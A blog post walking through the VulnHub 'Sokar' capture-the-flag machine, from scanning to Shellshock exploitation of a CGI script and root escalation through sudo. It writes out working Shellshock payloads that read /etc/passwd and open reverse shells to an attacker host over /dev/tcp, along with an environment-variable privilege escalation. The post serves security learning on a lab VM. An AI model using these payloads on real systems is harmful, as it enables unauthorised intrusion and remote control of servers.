---
layout: post
title: "vulhub-sokar"
date: 2016-07-15 10:27:33 -0500
comments: true
categories: [vulhub, sokar, shellshock]
---


###Tools:

* netdiscover
* Nmap
* Nikto
* User Agent Switcher


###Vulnerability:

* [shellshock(remote)](http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited)
* [shellshock(local)](http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code)

<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.56.0/24`

{% img  /images/blog/vulhub/sokar/Capture1.JPG   [title manually exploit [alt text]] %}

192.168.56.103 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.56.103 -p-`


{% img  /images/blog/vulhub/sokar/Capture2.JPG   [title manually exploit [alt text]] %}


port 591 is opening, looks like it is running http service.

use nikto to scan

`nikto -h 192.168.56.103:591`

nothing cool.

Use wufzz to scan

`wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.103/FUZZ 2>/dev/null`

{% img  /images/blog/vulhub/sokar/Capture3.JPG   [title manually exploit [alt text]] %}

find an interesting path `cgi-bin`. Thats interesting, because it reminds shellshock.

Use brower to check the web page

{% img  /images/blog/vulhub/sokar/Capture4.JPG   [title manually exploit [alt text]] %}

The web page shows result of commands `netstat` and `iostat`.

check the source code find the cgi path `/cgi-bin/cat`

{% img  /images/blog/vulhub/sokar/Capture5.JPG   [title manually exploit [alt text]] %}

start to verfiy shellshock:

```
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://192.168.56.103:591/cgi-bin/cat"
```

{% img  /images/blog/vulhub/sokar/Capture6.JPG   [title manually exploit [alt text]] %}

Confirmed.Also find two user names `bynarr` and `apophis`

I tried to upload reverse shell

```
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i > /dev/tcp/192.168.56.102/4444 0<&1" "http://192.168.56.103:591/cgi-bin/cat"
```


failed. I guess because certain ports are allowed.

keep going...

check the files belong to bynarr:

```
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /usr/bin/find / -user bynarr " "http://192.168.56.103:591/cgi-bin/cat"
```

{% img  /images/blog/vulhub/sokar/Capture8.JPG   [title manually exploit [alt text]] %}

Try to read each file I got, and find the `va/spool/mail/bynarr` is very interesting.

{% img  /images/blog/vulhub/sokar/Capture9.JPG   [title manually exploit [alt text]] %}

so now I know I can only use port 51242 to setup reverse shell.

Also I noticed that `.` is in environment variable `$PATH`, so that I can run a script in the current path firstly. 

write the reverse shell to iostat:

```
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/echo -e '#/bin/bash -i >& /dev/tcp/192.168.56.102/51242 0>&1' > /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
```

add the x attribute

```
wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/chmod +x /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
```

After serverl seconds I got shell:

{% img  /images/blog/vulhub/sokar/Capture10.JPG   [title manually exploit [alt text]] %}


next run `sudo -l` to check allowed commands for bynarr

{% img  /images/blog/vulhub/sokar/Capture11.JPG   [title manually exploit [alt text]] %}

so /home/bynarr/lime which is owned by root that bynarr can run.

in order to check shell shock locally. run:

`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`


local shell shock works

{% img  /images/blog/vulhub/sokar/Capture12.JPG   [title manually exploit [alt text]] %}


from the `sudo -l` output, there are many environment variables can be used. I ued USERNAME

`sudo USERNAME='() { :;}; /bin/bash' /home/bynarr/lime`

get the shell:

{% img  /images/blog/vulhub/sokar/Capture13.JPG   [title manually exploit [alt text]] %}
